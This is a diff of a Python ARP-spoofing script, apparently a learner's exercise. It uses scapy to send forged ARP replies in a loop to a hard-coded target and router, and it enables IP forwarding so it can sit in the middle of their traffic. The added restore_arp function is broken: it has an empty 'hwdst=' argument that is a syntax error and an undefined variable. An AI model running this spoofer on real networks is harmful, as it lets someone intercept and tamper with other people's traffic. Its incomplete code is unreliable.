@@ -3,7 +3,8 @@
 from time import sleep
 import scapy.all as scapy
 import subprocess
-import sys
+
+from scapy.packet import Packet
 
 # Hard coded values to replace via optparse
 target = {"name": "target", "ip": "10.211.55.6", "mac": "00:1c:42:aa:7c:10"}
@@ -30,16 +31,21 @@ def spoof(target, spoof):
         print(packet.summary())
     scapy.send(packet, verbose=False)
 
+def restore_arp(destination_ip, source_ip):
+    destination_mac = get_mac(options)
+    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=)
+
 subprocess.call(["bash", "-c", "echo 1 > /proc/sys/net/ipv4/ip_forward"]) # Setup routing/forwarding locally
 
 sent_packet_count = 0
-while True:
-    spoof(target, router)
-    sent_packet_count = sent_packet_count + 1
-    print("\r[+] arp_spoof packet: " + str(sent_packet_count) + " to " + target["name"], end="")
-    spoof(router, target)
-    sent_packet_count = sent_packet_count + 1
-    print(" packet: " + str(sent_packet_count) + " to " + router["name"], end="")
-    # sys.stdout.flush()
-    # print("[+] arp_spoof " + router["name"])
-    sleep(1)
+try:
+    while True:
+        spoof(target, router)
+        sent_packet_count = sent_packet_count + 1
+        print("\r[+] arp_spoof packet: " + str(sent_packet_count) + " to " + target["name"], end="")
+        spoof(router, target)
+        sent_packet_count = sent_packet_count + 1
+        print(" packet: " + str(sent_packet_count) + " to " + router["name"], end="")
+        sleep(1)
+except KeyboardInterrupt:
+    print("\n[+] Detected CTRL +C .... Quitting.")
